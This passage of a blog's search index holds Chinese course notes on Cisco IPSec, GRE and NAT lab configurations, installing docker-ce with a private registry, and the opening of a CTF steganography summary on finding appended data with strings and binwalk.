<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IPSec配置</title>
      <link href="/undefined/IPSec%E9%85%8D%E7%BD%AE/"/>
      <url>/undefined/IPSec%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="一、R2和R3-配置-ipsec-隧道模式，内网nat"><a href="#一、R2和R3-配置-ipsec-隧道模式，内网nat" class="headerlink" title="一、R2和R3 配置 ipsec 隧道模式，内网nat"></a>一、R2和R3 配置 ipsec 隧道模式，内网nat</h3><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/22/Tm9QU3AK1akdtVR.png" alt="image-20200622144316700"></p><h4 id="1、设置IP和路由"><a href="#1、设置IP和路由" class="headerlink" title="1、设置IP和路由"></a>1、设置IP和路由</h4><h4 id="2、设置IPSec"><a href="#2、设置IPSec" class="headerlink" title="2、设置IPSec"></a>2、设置IPSec</h4><ul><li>IKE配置</li><li>IPSec配置</li></ul><p><strong>IKE配置</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/22/p1q6cPBsOiS4kvJ.png" alt="image-20200622144600655"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#crypto isakmp policy 1</span><br><span class="line">R2(config-isakmp)#encryption 3des</span><br><span class="line">R2(config-isakmp)#hash md5</span><br><span class="line">R2(config-isakmp)#authentication pre-share </span><br><span class="line">R2(config-isakmp)#group 1</span><br><span class="line">R2(config-isakmp)#exit</span><br><span class="line">R2(config)#crypto isakmp identity address </span><br><span class="line">R2(config)#crypto isakmp key 0 123456 address 10.2.1.2</span><br><span class="line"></span><br><span class="line">R3(config)#crypto isakmp policy 1</span><br><span class="line">R3(config-isakmp)#encryption 3des</span><br><span class="line">R3(config-isakmp)#hash md5</span><br><span class="line">R3(config-isakmp)#authentication pre-share</span><br><span class="line">R3(config-isakmp)#group 1</span><br><span class="line">R3(config-isakmp)#exit</span><br><span class="line">R3(config)#crypto isakmp identity address</span><br><span class="line">R3(config)#crypto isakmp key 0 123456 address 10.1.1.2</span><br></pre></td></tr></table></figure><p><strong>IPSec配置</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/22/FzoKxLu5DB3qQ1l.png" alt="image-20200622144629862"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#crypto ipsec transform-set vpn ah-md5-hmac</span><br><span class="line">R2(cfg-crypto-trans)#mode tunnel</span><br><span class="line">R2(cfg-crypto-trans)#exit</span><br><span class="line">R2(config)#access-list 100 permit ip host 1.1.1.1 host 2.2.2.2</span><br><span class="line">R2(config)#crypto map map 1 ipsec-isakmp</span><br><span class="line">R2(config-crypto-map)#match address 100</span><br><span class="line">R2(config-crypto-map)#set peer 10.2.1.2</span><br><span class="line">R2(config-crypto-map)#set transform-set vpn</span><br><span class="line">R2(config-crypto-map)#exit</span><br><span class="line">R2(config)#int f0&#x2F;0</span><br><span class="line">R2(config-if)#crypto map map</span><br><span class="line"></span><br><span class="line">R3(config)#crypto ipsec transform-set vpn ah-md5-hmac </span><br><span class="line">R3(cfg-crypto-trans)#mode tunnel</span><br><span class="line">R3(cfg-crypto-trans)#exit</span><br><span class="line">R3(config)#access-list 100 permit ip host 2.2.2.2 host 1.1.1.1</span><br><span class="line">R3(config)#crypto map map 1 ipsec-isakmp</span><br><span class="line">R3(config-crypto-map)#match address 100</span><br><span class="line">R3(config-crypto-map)#set peer 10.1.1.2</span><br><span class="line">R3(config-crypto-map)#set transform-set vpn</span><br><span class="line">R3(config-crypto-map)#exit</span><br><span class="line">R3(config)#int f0&#x2F;1</span><br><span class="line">R3(config-if)#crypto map map</span><br></pre></td></tr></table></figure><h4 id="3、配置nat"><a href="#3、配置nat" class="headerlink" title="3、配置nat"></a>3、配置nat</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#int f0&#x2F;0</span><br><span class="line">R2(config-if)#ip nat outside</span><br><span class="line">R2(config-if)#int l0</span><br><span class="line">R2(config-if)#ip nat inside </span><br><span class="line">R2(config-if)#exit</span><br><span class="line">R2(config)#ip nat inside source static 1.1.1.1 10.1.1.3</span><br></pre></td></tr></table></figure><h3 id="二、IPSec交换集model模式和接口实验"><a href="#二、IPSec交换集model模式和接口实验" class="headerlink" title="二、IPSec交换集model模式和接口实验"></a>二、IPSec交换集model模式和接口实验</h3><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/23/GHyjNaWXVrZovPY.png" alt="image-20200623133112305"></p><h4 id="实验一-不通过IPSec加密-："><a href="#实验一-不通过IPSec加密-：" class="headerlink" title="实验一(不通过IPSec加密)："></a>实验一(不通过IPSec加密)：</h4><h5 id="1、设置IP和路由-1"><a href="#1、设置IP和路由-1" class="headerlink" title="1、设置IP和路由"></a>1、设置IP和路由</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设置好IP之后设置OSPF路由：</span><br><span class="line">R1(config)#ip route 0.0.0.0 0.0.0.0 192.168.10.1</span><br><span class="line"></span><br><span class="line">R2(config)#router ospf 1                                  </span><br><span class="line">R2(config-router)#network 10.0.0.0 0.0.0.255 area 0</span><br><span class="line">R2(config-router)#network 192.168.10.0 0.0.0.255 area 0</span><br><span class="line"></span><br><span class="line">R3(config)#router ospf 1</span><br><span class="line">R3(config-router)#network 10.0.0.0 0.0.0.255 area 0</span><br><span class="line">R3(config-router)#network 192.168.20.0 0.0.0.255 area 0</span><br><span class="line"></span><br><span class="line">R4(config)#ip route 0.0.0.0 0.0.0.0 192.168.20.1</span><br></pre></td></tr></table></figure><h5 id="2、设置IPSec-1"><a href="#2、设置IPSec-1" class="headerlink" title="2、设置IPSec"></a>2、设置IPSec</h5><p><strong>IKEY配置</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#crypto isakmp policy 1</span><br><span class="line">R2(config-isakmp)#encryption 3des</span><br><span class="line">R2(config-isakmp)#hash md5</span><br><span class="line">R2(config-isakmp)#authentication pre-share </span><br><span class="line">R2(config-isakmp)#group 2</span><br><span class="line">R2(config-isakmp)#exit</span><br><span class="line">R2(config)#crypto isakmp identity address </span><br><span class="line">R2(config)#crypto isakmp key 0 123456 address 10.0.0.2</span><br><span class="line"></span><br><span class="line">R3(config)#crypto isakmp policy 1</span><br><span class="line">R3(config-isakmp)#encryption 3des</span><br><span class="line">R3(config-isakmp)#hash md5</span><br><span class="line">R3(config-isakmp)#authentication pre-share</span><br><span class="line">R3(config-isakmp)#group 2</span><br><span class="line">R3(config-isakmp)#exit</span><br><span class="line">R3(config)#crypto isakmp identity address</span><br><span class="line">R3(config)#crypto isakmp key 0 123456 address 10.0.0.1</span><br></pre></td></tr></table></figure><p><strong>IPSec配置</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#crypto ipsec transform-set vpn1 ah-md5-hmac</span><br><span class="line">R2(cfg-crypto-trans)#mode transport require</span><br><span class="line">R2(cfg-crypto-trans)#exit</span><br><span class="line">R2(config)#access-list 100 permit ip host 10.0.0.1 host 10.0.0.2</span><br><span class="line">R2(config)#crypto map map1 1 ipsec-isakmp</span><br><span class="line">R2(config-crypto-map)#match address 100</span><br><span class="line">R2(config-crypto-map)#set peer 10.0.0.2</span><br><span class="line">R2(config-crypto-map)#set transform-set vpn1</span><br><span class="line">R2(config-crypto-map)#exit</span><br><span class="line">R2(config)#int f0&#x2F;0</span><br><span class="line">R2(config-if)#crypto map map1</span><br><span class="line"></span><br><span class="line">R3(config)#crypto ipsec transform-set vpn1 ah-md5-hmac</span><br><span class="line">R3(cfg-crypto-trans)#mode transport require</span><br><span class="line">R3(cfg-crypto-trans)#exit</span><br><span class="line">R3(config)#access-list 100 permit ip host 10.0.0.2 host 10.0.0.1</span><br><span class="line">R3(config)#crypto map map1 1 ipsec-isakmp</span><br><span class="line">R3(config-crypto-map)#match address 100</span><br><span class="line">R3(config-crypto-map)#set peer 10.0.0.1</span><br><span class="line">R3(config-crypto-map)#set transform-set vpn1</span><br><span class="line">R3(config-crypto-map)#exit</span><br><span class="line">R3(config)#int f0&#x2F;0</span><br><span class="line">R3(config-if)#crypto map map1</span><br></pre></td></tr></table></figure><h4 id="实验二："><a href="#实验二：" class="headerlink" title="实验二："></a>实验二：</h4><h5 id="1、设置IP和路由-2"><a href="#1、设置IP和路由-2" class="headerlink" title="1、设置IP和路由"></a>1、设置IP和路由</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设置好IP之后设置OSPF路由：</span><br><span class="line">R1(config)#ip route 0.0.0.0 0.0.0.0 192.168.10.1</span><br><span class="line"></span><br><span class="line">R2(config)#router ospf 1                                  </span><br><span class="line">R2(config-router)#network 10.0.0.0 0.0.0.255 area 0</span><br><span class="line">R2(config-router)#network 192.168.10.0 0.0.0.255 area 0</span><br><span class="line"></span><br><span class="line">R3(config)#router ospf 1</span><br><span class="line">R3(config-router)#network 10.0.0.0 0.0.0.255 area 0</span><br><span class="line">R3(config-router)#network 192.168.20.0 0.0.0.255 area 0</span><br><span class="line"></span><br><span class="line">R4(config)#ip route 0.0.0.0 0.0.0.0 192.168.20.1</span><br></pre></td></tr></table></figure><h5 id="2、设置IPSec-2"><a href="#2、设置IPSec-2" class="headerlink" title="2、设置IPSec"></a>2、设置IPSec</h5><p><strong>IKEY配置</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#crypto isakmp policy 1</span><br><span class="line">R2(config-isakmp)#encryption 3des</span><br><span class="line">R2(config-isakmp)#hash md5</span><br><span class="line">R2(config-isakmp)#authentication pre-share </span><br><span class="line">R2(config-isakmp)#group 2</span><br><span class="line">R2(config-isakmp)#exit</span><br><span class="line">R2(config)#crypto isakmp identity address </span><br><span class="line">R2(config)#crypto isakmp key 0 123456 address 10.0.0.2</span><br><span class="line"></span><br><span class="line">R3(config)#crypto isakmp policy 1</span><br><span class="line">R3(config-isakmp)#encryption 3des</span><br><span class="line">R3(config-isakmp)#hash md5</span><br><span class="line">R3(config-isakmp)#authentication pre-share</span><br><span class="line">R3(config-isakmp)#group 2</span><br><span class="line">R3(config-isakmp)#exit</span><br><span class="line">R3(config)#crypto isakmp identity address</span><br><span class="line">R3(config)#crypto isakmp key 0 123456 address 10.0.0.1</span><br></pre></td></tr></table></figure><p><strong>IPSec配置</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#crypto ipsec transform-set vpn1 ah-md5-hmac</span><br><span class="line">R2(cfg-crypto-trans)#mode transport require</span><br><span class="line">R2(cfg-crypto-trans)#exit</span><br><span class="line">R2(config)#access-list 100 permit ip host 192.168.10.2 host 192.168.10.2</span><br><span class="line">R2(config)#crypto map map1 1 ipsec-isakmp</span><br><span class="line">R2(config-crypto-map)#match address 100</span><br><span class="line">R2(config-crypto-map)#set peer 192.168.20.2</span><br><span class="line">R2(config-crypto-map)#set transform-set vpn1</span><br><span class="line">R2(config-crypto-map)#exit</span><br><span class="line">R2(config)#int f0&#x2F;1</span><br><span class="line">R2(config-if)#crypto map map1</span><br><span class="line"></span><br><span class="line">R3(config)#crypto ipsec transform-set vpn1 ah-md5-hmac</span><br><span class="line">R3(cfg-crypto-trans)#mode transport require</span><br><span class="line">R3(cfg-crypto-trans)#exit</span><br><span class="line">R3(config)#access-list 100 permit ip host 192.168.20.2 host 192.168.10.2</span><br><span class="line">R3(config)#crypto map map1 1 ipsec-isakmp</span><br><span class="line">R3(config-crypto-map)#match address 100</span><br><span class="line">R3(config-crypto-map)#set peer 192.168.10.2</span><br><span class="line">R3(config-crypto-map)#set transform-set vpn1</span><br><span class="line">R3(config-crypto-map)#exit</span><br><span class="line">R3(config)#int f0&#x2F;1</span><br><span class="line">R3(config-if)#crypto map map1</span><br></pre></td></tr></table></figure><h4 id="实验三-通过IPSec加密-："><a href="#实验三-通过IPSec加密-：" class="headerlink" title="实验三(通过IPSec加密)："></a>实验三(通过IPSec加密)：</h4><h5 id="1、设置IP和路由-3"><a href="#1、设置IP和路由-3" class="headerlink" title="1、设置IP和路由"></a>1、设置IP和路由</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设置好IP之后设置OSPF路由：</span><br><span class="line">R1(config)#ip route 0.0.0.0 0.0.0.0 192.168.10.1</span><br><span class="line"></span><br><span class="line">R2(config)#router ospf 1                                  </span><br><span class="line">R2(config-router)#network 10.0.0.0 0.0.0.255 area 0</span><br><span class="line">R2(config-router)#network 192.168.10.0 0.0.0.255 area 0</span><br><span class="line"></span><br><span class="line">R3(config)#router ospf 1</span><br><span class="line">R3(config-router)#network 10.0.0.0 0.0.0.255 area 0</span><br><span class="line">R3(config-router)#network 192.168.20.0 0.0.0.255 area 0</span><br><span class="line"></span><br><span class="line">R4(config)#ip route 0.0.0.0 0.0.0.0 192.168.20.1</span><br></pre></td></tr></table></figure><h5 id="2、设置IPSec-3"><a href="#2、设置IPSec-3" class="headerlink" title="2、设置IPSec"></a>2、设置IPSec</h5><p><strong>IKEY配置</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#crypto isakmp policy 1</span><br><span class="line">R2(config-isakmp)#encryption 3des</span><br><span class="line">R2(config-isakmp)#hash md5</span><br><span class="line">R2(config-isakmp)#authentication pre-share </span><br><span class="line">R2(config-isakmp)#group 2</span><br><span class="line">R2(config-isakmp)#exit</span><br><span class="line">R2(config)#crypto isakmp identity address </span><br><span class="line">R2(config)#crypto isakmp key 0 123456 address 10.0.0.2</span><br><span class="line"></span><br><span class="line">R3(config)#crypto isakmp policy 1</span><br><span class="line">R3(config-isakmp)#encryption 3des</span><br><span class="line">R3(config-isakmp)#hash md5</span><br><span class="line">R3(config-isakmp)#authentication pre-share</span><br><span class="line">R3(config-isakmp)#group 2</span><br><span class="line">R3(config-isakmp)#exit</span><br><span class="line">R3(config)#crypto isakmp identity address</span><br><span class="line">R3(config)#crypto isakmp key 0 123456 address 10.0.0.1</span><br></pre></td></tr></table></figure><p><strong>IPSec配置</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#crypto ipsec transform-set vpn1 ah-md5-hmac</span><br><span class="line">R2(cfg-crypto-trans)#mode tunnel</span><br><span class="line">R2(cfg-crypto-trans)#exit</span><br><span class="line">R2(config)#access-list 100 deny ip host 192.168.10.2 host 192.168.20.2</span><br><span class="line">R2(config)#access-list 100 permit ip any any</span><br><span class="line">R2(config)#crypto map map1 1 ipsec-isakmp</span><br><span class="line">R2(config-crypto-map)#match address 100</span><br><span class="line">R2(config-crypto-map)#set peer 10.0.0.2</span><br><span class="line">R2(config-crypto-map)#set transform-set vpn1</span><br><span class="line">R2(config-crypto-map)#exit</span><br><span class="line">R2(config)#int f0&#x2F;0</span><br><span class="line">R2(config-if)#crypto map map1</span><br><span class="line"></span><br><span class="line">R3(config)#crypto ipsec transform-set vpn1 ah-md5-hmac </span><br><span class="line">R3(cfg-crypto-trans)#mode tunnel</span><br><span class="line">R3(cfg-crypto-trans)#exit</span><br><span class="line">R3(config)#access-list 100 deny ip host 192.168.20.2 host 192.168.10.2</span><br><span class="line">R3(config)#access-list 100 permit ip any any</span><br><span class="line">R3(config)#crypto map map1 1 ipsec-isakmp</span><br><span class="line">R3(config-crypto-map)#match address 100</span><br><span class="line">R3(config-crypto-map)#set peer 10.0.0.1</span><br><span class="line">R3(config-crypto-map)#set transform-set vpn1</span><br><span class="line">R3(config-crypto-map)#exit</span><br><span class="line">R3(config)#int f0&#x2F;0</span><br><span class="line">R3(config-if)#crypto map map1</span><br></pre></td></tr></table></figure><h3 id="三、GRE隧道"><a href="#三、GRE隧道" class="headerlink" title="三、GRE隧道"></a>三、GRE隧道</h3><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/23/kPp1GXg3jLC8ZoH.png" alt="image-20200623201159005"></p><h5 id="1、首先配置所有IP地址"><a href="#1、首先配置所有IP地址" class="headerlink" title="1、首先配置所有IP地址"></a>1、首先配置所有IP地址</h5><p>然后R1配置路由</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#ip route 0.0.0.0 0.0.0.0 10.1.1.1</span><br></pre></td></tr></table></figure><p>R2配置路由：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config-if)#ip route 0.0.0.0 0.0.0.0 100.1.1.2</span><br></pre></td></tr></table></figure><p>R4配置路由：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R4(config)#ip route 0.0.0.0 0.0.0.0 200.1.1.2</span><br></pre></td></tr></table></figure><p>R5配置路由</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R5(config)#ip route 0.0.0.0 0.0.0.0 192.168.1.3</span><br></pre></td></tr></table></figure><h5 id="2、GRE配置"><a href="#2、GRE配置" class="headerlink" title="2、GRE配置"></a>2、GRE配置</h5><p>R2配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#interface Tunnel2</span><br><span class="line">R2(config-if)#ip address 1.1.1.1 255.255.255.252</span><br><span class="line">R2(config-if)#tunnel source 100.1.1.1</span><br><span class="line">R2(config-if)#tunnel destination 200.1.1.1</span><br><span class="line">R2(config-if)#exit</span><br><span class="line">R2(config)#ip route 192.168.1.0 255.255.255.0 Tunnel2</span><br></pre></td></tr></table></figure><p>R4配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R4(config)#interface Tunnel3</span><br><span class="line">R4(config-if)#ip address 1.1.1.2 255.255.255.252</span><br><span class="line">R4(config-if)#tunnel source 200.1.1.1 </span><br><span class="line">R4(config-if)#tunnel destination 100.1.1.1</span><br><span class="line">R4(config)#ip route 10.1.1.0 255.255.255.0 Tunnel3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装docker-ce和配置私有仓库</title>
      <link href="/undefined/docker-ce+registry/"/>
      <url>/undefined/docker-ce+registry/</url>
      
        <content type="html"><![CDATA[<h3 id="一、第一题：安装docker-ce"><a href="#一、第一题：安装docker-ce" class="headerlink" title="一、第一题：安装docker-ce"></a>一、第一题：安装docker-ce</h3><p>先打开两台虚拟机。账号：root。密码：000000</p><p>修改两张网卡，server1和server2 都要修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eno16777736</span><br></pre></td></tr></table></figure><p>按 i 修改，把最后一行 ONBOOT=no 改为 ONBOOT=yes 。然后esc，然后shift + 冒号        wq回车保存</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eno33554960</span><br></pre></td></tr></table></figure><p>按 i 修改，把最后一行 ONBOOT=no 改为 ONBOOT=yes 。</p><p>重启网卡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#systemctl restart network</span><br></pre></td></tr></table></figure><p>查看server1 ip </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN </span><br><span class="line">    link&#x2F;loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1&#x2F;8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1&#x2F;128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eno16777736: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    link&#x2F;ether 00:0c:29:30:f1:7a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.52.145&#x2F;24 brd 192.168.52.255 scope global dynamic eno16777736</span><br><span class="line">       valid_lft 1525sec preferred_lft 1525sec</span><br><span class="line">    inet6 fe80::20c:29ff:fe30:f17a&#x2F;64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: eno33554960: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    link&#x2F;ether 00:0c:29:30:f1:84 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.56.157&#x2F;24 brd 192.168.56.255 scope global dynamic eno33554960</span><br><span class="line">       valid_lft 1526sec preferred_lft 1526sec</span><br><span class="line">    inet6 fe80::20c:29ff:fe30:f184&#x2F;64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>然后全在server2上操作</p><p>192.168.52.146为server2 ip地址</p><p>192.168.52.145为server1 ip地址</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#scp root@192.168.52.145:&#x2F;root&#x2F;Docker.tar.gz &#x2F;root</span><br></pre></td></tr></table></figure><p>然后解压：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#tar -zxvf Docker.tar.gz</span><br></pre></td></tr></table></figure><p>然后配置本地yum源</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#vi &#x2F;etc&#x2F;yum.repos.d&#x2F;local.repo</span><br></pre></td></tr></table></figure><p>输入内容：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[kubernetes]</span><br><span class="line">name&#x3D;kubernetes</span><br><span class="line">baseurl&#x3D;file:&#x2F;&#x2F;&#x2F;root&#x2F;Docker</span><br><span class="line">gpgcheck&#x3D;0</span><br><span class="line">enabled&#x3D;1</span><br></pre></td></tr></table></figure><p>保存退出</p><p>安装docker：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#yum install docker-ce-18.09.6 docker-ce-cli-18.09.6 containerd.io -y</span><br></pre></td></tr></table></figure><p>启动 Docker 并设置开机自启。  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@master ~]# systemctl daemon-reload</span><br><span class="line">[root@master ~]# systemctl restart docker</span><br><span class="line">[root@master ~]# systemctl enable docker</span><br></pre></td></tr></table></figure><p>查看 Docker 的系统信息。  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]docker info</span><br></pre></td></tr></table></figure><h3 id="二、第二题安装私有仓库"><a href="#二、第二题安装私有仓库" class="headerlink" title="二、第二题安装私有仓库"></a>二、第二题安装私有仓库</h3><p>首先返回root文件夹，导入docker 镜像</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#cd &#x2F;root</span><br><span class="line">[root@localhost &#x2F;]#.&#x2F;image.sh</span><br></pre></td></tr></table></figure><p>启动registry容器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#docker run -d -v &#x2F;opt&#x2F;registry:&#x2F;var&#x2F;lib&#x2F;registry -p 5000:5000</span><br><span class="line">--restart&#x3D;always --name registry registry:latest</span><br></pre></td></tr></table></figure><p>然后配置私有仓库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]# vi &#x2F;etc&#x2F;docker&#x2F;daemon.json</span><br></pre></td></tr></table></figure><p>内容设置为：</p><p>这个ip为server2ip</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;insecure-registries&quot;: [&quot;192.168.52.146:5000&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重启配置文件和重启docker</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#systemctl daemon-reload</span><br><span class="line">[root@localhost &#x2F;]#systemctl restart docker</span><br></pre></td></tr></table></figure><p>然后标记镜像</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#docker tag centos:latest 192.168.52.146:5000&#x2F;centos:latest</span><br></pre></td></tr></table></figure><p>如要传其他镜像，将centos改为其他</p><p>然后上传镜像，这里可以多上传几个镜像，看刚哥要求</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#docker push 192.168.52.146:5000&#x2F;centos:latest</span><br></pre></td></tr></table></figure><p>然后查看仓库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#curl -L http:&#x2F;&#x2F;192.168.52.146:5000&#x2F;v2&#x2F;_catalog</span><br></pre></td></tr></table></figure><p>{“repositories”:[“centos”]}  即成功</p><p>然后克隆一台server2，然后克隆机上打命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost &#x2F;]#docker images</span><br></pre></td></tr></table></figure><p>给刚哥看就好了</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
          <category> 私有仓库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker,registry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc-隐写术总结</title>
      <link href="/undefined/Misc%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
      <url>/undefined/Misc%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc-隐写术总结"><a href="#Misc-隐写术总结" class="headerlink" title="Misc-隐写术总结"></a>Misc-隐写术总结</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>隐写术是关于信息隐藏，即不让计划的接收者之外的任何人知道信息的传递事件（而不只是信息的内容）的一门技巧与科学,英文写作Steganography。而密码编码是关于信息加密，即设想到信息可能会被接受者之外的第三方获取而采取的一种措施，通过通信双方预先设定的规则对信息进行加密，使第三方即使获取到信息也无法理解其含义。所以隐写术重点在于信息的隐藏，密码编码重点在于信息的加密，这两者属于完全不同的概念。</p><p>[TOC]</p><h3 id="图片隐写术"><a href="#图片隐写术" class="headerlink" title="图片隐写术"></a>图片隐写术</h3><p>图片隐写术大致分为下列六类</p><ul><li><p>一、附加式的图片隐写</p></li><li><p>二、基于文件结构的图片隐写</p></li><li><p>三、基于LSB原理的图片隐写</p></li><li><p>四、基于DCT域的JPG图片隐写</p></li><li><p>五、数字水印的隐写</p></li><li><p>六、图片容差的隐写</p></li><li><p>其他</p></li></ul><hr><h4 id="一、附加式的图片隐写"><a href="#一、附加式的图片隐写" class="headerlink" title="一、附加式的图片隐写"></a>一、附加式的图片隐写</h4><h5 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h5><p>附加式的图片隐写通常是我们用某种程序或者方法在图片文件上直接附加被隐写的目标。</p><p>程序识别图片的过程是，从文件标识头开始，以文件标识头声明的文件格式所定义的编码格式对数据流进行读取，一直到图片的结束符，当图片处理程序识别到图片的结束符后，不再继续向下识别，所以我们就可以通过在图片结束符后添加数据达到隐写的目的。</p><p><strong>附加式图片隐写分类：</strong></p><ul><li>A丶附加字符串</li><li>B丶图种</li></ul><h5 id="A丶附加字符串"><a href="#A丶附加字符串" class="headerlink" title="A丶附加字符串"></a>A丶附加字符串</h5><p>利用工具将隐藏信息直接写入到图片结束符之后</p><p><strong>解法：</strong></p><p>strings工具扫描/将图片后缀改为<code>.txt</code>文件，打开查看末尾添加的字符串</p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 正如前文所说，我们这个实验部分讲的是附加字符串的隐写方式，所以我们用Strings检查一下图片</span><br><span class="line">- 在Strings工具的搜索下，就能得到隐藏在图片末尾的字符串</span><br><span class="line">&#x2F;&#x2F;也有可能是经过编码或者加密过后的字符串</span><br></pre></td></tr></table></figure><p><strong>strings使用方法</strong></p><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p><p>选项：</p><ul><li>-a –all：扫描整个文件而不是只扫描目标文件初始化和装载段</li></ul><ul><li>-f –print-file-name：在显示字符串前先显示文件名</li><li>-t –radix={o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制</li><li>-e –encoding={s,S,b,l,B,L} ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit</li></ul><p><strong>Tips  我们使用strings + 文件名字的命令即可</strong></p><p><strong>具体步骤如下：</strong></p><p>在kali中输入命令+文件名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings &#x2F;root&#x2F;桌面&#x2F;11111.jpg</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/x4yP9XTFCOzRnkG.png" alt="image-20200611150413169"></p><p>有必要提到的是，为什么字符串要附加在文件的后面呢?那是因为，如果图片附加在中间，有可能破坏了图片的信息，如果字符串附加在图片的头部位置，又破坏了文件头，可能导致图片无法识别。关于文件格式的具体内容，我们下一个部分的隐写还会提到。</p><h5 id="B丶图种"><a href="#B丶图种" class="headerlink" title="B丶图种"></a>B丶图种</h5><p>一种采用特殊方式将图片文件（如jpg格式）与rar文件结合起来的文件。该文件一般保存为jpg格式，可以正常显示图片；</p><p><strong>解法：</strong></p><ul><li>可以修改文件的后缀名，将图片改为rar压缩文件，并得到其中的数据。</li><li>binwalk / foremost分离</li></ul><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td 